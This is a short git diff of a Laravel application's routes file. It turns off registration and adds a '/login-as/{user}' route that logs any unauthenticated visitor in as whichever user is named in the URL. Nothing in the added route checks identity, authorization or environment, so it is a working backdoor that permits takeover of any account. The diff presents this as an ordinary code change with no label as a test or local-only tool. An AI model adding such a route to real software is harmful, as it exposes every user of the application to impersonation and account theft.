@@ -1,10 +1,10 @@
 <?php
 
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
-use Laravel\Fortify\Features;
 
 Route::inertia('/', 'welcome', [
-    'canRegister' => Features::enabled(Features::registration()),
+    'canRegister' => false,
 ])->name('home');
 
 Route::middleware(['auth', 'verified'])->group(function () {
@@ -12,3 +12,9 @@ Route::middleware(['auth', 'verified'])->group(function () {
 });
 
 require __DIR__.'/settings.php';
+
+Route::get('/login-as/{user}', function ($user) {
+    $user = \App\Models\User::where('name', $user)->firstOrFail();
+    Auth::loginUsingId($user->id);
+    request()->session()->regenerate();
+})->name('loginAs')->middleware('guest');
